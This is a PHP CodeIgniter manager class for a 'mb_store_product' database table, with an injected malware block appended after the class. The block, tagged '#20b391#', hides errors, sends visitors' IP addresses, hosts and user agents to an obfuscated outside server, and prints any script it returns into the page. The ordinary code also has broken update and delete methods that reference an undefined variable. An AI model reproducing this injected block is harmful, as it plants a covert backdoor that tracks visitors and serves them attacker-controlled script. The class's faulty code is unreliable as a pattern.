<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MbStoreProductManager extends MbAbstractManager {
	private $_TABLE_NAME = 'mb_store_product';

	function __construct()
	{
		parent::__construct();
	}
	public function select($model) {
		return $this->_select($this->_TABLE_NAME, $model);
	}
	public function selectByPage($model, $limit, $offset) {
		return $this->_selectByPage($this->_TABLE_NAME, $model, $limit, $offset);
	}
	public function insert($model) {
		return $this->_insert($this->_TABLE_NAME, $model);
	}
	public function update($model) {
		return $this->_update($this->_TABLE_NAME, $model);
	}
	public function delete($model) {
		return $this->_delete($this->_TABLE_NAME, $model);
	}
	public function _select($table, $model) {
		$whereCondition = $this->getWhereObject($model);
		$query = $this->db->get_where($table, $whereCondition);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}

	public function _selectByPage($table, $model, $limit, $offset) {
		$whereCondition = $this->getWhereObject($model);
		$query = $this->db->get_where($table, $whereCondition, $limit, $offset);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}

	public function _insert($table, $model) {
		$this->db->insert($table, $this->getDataObject($model));
		return $this->db->insert_id();
	}

	public function _update($table, $model) {
		$this->db->where('id_', $orderModel->getId());
		$this->db->update($table, getDataObject($model));
	}

	public function _delete($table, $model) {
		$this->db->where('id_', $orderModel->getId());
		$this->db->delete($table);
	}
	/**
	 * convert from Database Record to MbStoreProductModel
	 * @param record $record
	 * @return MbStoreProductModel
	 */
	protected function convert ($record) {
		$model = new StoreProductModel();
		$model->setProductId($record->product_id_);
		$model->setStoreId($record->store_id_);
		$model->setPrice($record->price_);
		$model->setPaymentPrice($record->payment_price_);
		$model->setDiscountPrice($record->discount_price_);
		$model->setDiscountInfo($record->discount_info_);
		$model->setQuantity($record->quantity_);
		$model->setWarranty($record->warranty_);
		return $model;
	}

	/**
	 * generate insert (update) data
	 * @param MbStoreProductModel $model
	 * array
	 */
	protected function getDataObject($model) {
		return array(
			'product_id_' => $model->getProductId(),
			'store_id_' => $model->getStoreId(),
			'price_' => $model->getPrice(),
			'payment_price_' => $model->getPaymentPrice(),
			'discount_price_' => $model->getDiscountPrice(),
			'discount_info_' => $model->getDiscountInfo(),
			'quantity_' => $model->getQuantity(),
			'warranty_' => $model->getWarranty()
		);
	}

	/**
	 * generate where condition
	 * @param MbStoreProductModel $model
	 * array
	 */
	protected function getWhereObject($model) {
		$whereCondition = array();
		if (!is_null($model->getProductId())) {
			$whereCondition['product_id_'] = $model->getProductId();
		}
		if (!is_null($model->getStoreId())) {
			$whereCondition['store_id_'] = $model->getStoreId();
		}
		if (!is_null($model->getPrice())) {
			$whereCondition['price_'] = $model->getPrice();
		}
		if (!is_null($model->getPaymentPrice())) {
			$whereCondition['payment_price_'] = $model->getPaymentPrice();
		}
		if (!is_null($model->getDiscountPrice())) {
			$whereCondition['discount_price_'] = $model->getDiscountPrice();
		}
		if (!is_null($model->getDiscountInfo())) {
			$whereCondition['discount_info_'] = $model->getDiscountInfo();
		}
		if (!is_null($model->getQuantity())) {
			$whereCondition['quantity_'] = $model->getQuantity();
		}
		if (!is_null($model->getWarranty())) {
			$whereCondition['warranty_'] = $model->getWarranty();
		}
		return $whereCondition;
	}
}

?>
<?php
#20b391#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/20b391#
?>